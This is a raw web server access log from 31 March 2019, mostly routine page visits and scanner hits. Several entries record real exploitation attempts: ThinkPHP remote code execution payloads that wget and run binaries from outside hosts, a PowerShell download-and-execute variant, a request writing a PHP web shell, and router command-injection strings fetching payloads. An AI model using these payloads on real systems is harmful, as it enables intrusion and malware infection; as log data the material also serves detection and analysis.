86.101.187.225 - - [31/Mar/2019:00:30:53 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
109.191.238.72 - - [31/Mar/2019:01:43:14 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
195.231.8.124 - - [31/Mar/2019:01:55:10 +0800] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.244.25.145/love/ai.x86%20;chmod%20777%20*%20ai.x86;%20cat%20ai.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 404 1121 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.5.1.el7.x86_64"
186.208.27.223 - - [31/Mar/2019:02:13:25 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
195.231.8.124 - - [31/Mar/2019:02:27:10 +0800] "GET /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://185.244.25.145/love/ai.x86%20;chmod%20777%20*%20ai.x86;%20cat%20ai.x86%20%3E%20efjins;chmod%20777%20efjins;./efjins%20thinkphp HTTP/1.1" 404 1121 "-" "python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-957.5.1.el7.x86_64"
119.29.163.219 - - [31/Mar/2019:02:32:42 +0800] "GET /public/index.php?s=index/think\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/chvyhyqvogtuugs22183.exe');start%20C:/Windows/temp/chvyhyqvogtuugs22183.exe HTTP/1.1" 404 1121 "http://119.29.225.142:80/public/index.php?s=index/think\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/chvyhyqvogtuugs22183.exe');start C:/Windows/temp/chvyhyqvogtuugs22183.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
119.29.163.219 - - [31/Mar/2019:02:32:42 +0800] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php HTTP/1.1" 404 1121 "http://119.29.225.142:80/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
119.29.163.219 - - [31/Mar/2019:02:32:42 +0800] "GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/chvyhyqvogtuugs22183.exe');start%20C:/Windows/temp/chvyhyqvogtuugs22183.exe HTTP/1.1" 404 1121 "http://119.29.225.142:80/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/chvyhyqvogtuugs22183.exe');start C:/Windows/temp/chvyhyqvogtuugs22183.exe" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
91.249.181.45 - - [31/Mar/2019:04:15:08 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.249.181.45 - - [31/Mar/2019:04:15:08 +0800] "GET /maker/snwrite.cgi?mac=1234;wget%20http://93.188.163.62/snwrite HTTP/1.1" 404 1121 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.249.181.45 - - [31/Mar/2019:04:15:09 +0800] "GET /login.cgi?cli=aa%20aa%27;wget%20http://93.188.163.62/dsl2750b%27$ HTTP/1.1" 404 1121 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
92.118.161.21 - - [31/Mar/2019:05:03:52 +0800] "GET / HTTP/1.0" 400 1127 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
60.191.38.78 - - [31/Mar/2019:05:25:02 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
68.183.105.216 - - [31/Mar/2019:08:02:07 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 zgrab/0.x"
185.103.246.177 - - [31/Mar/2019:08:24:11 +0800] "GET / HTTP/1.1" 200 12678 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
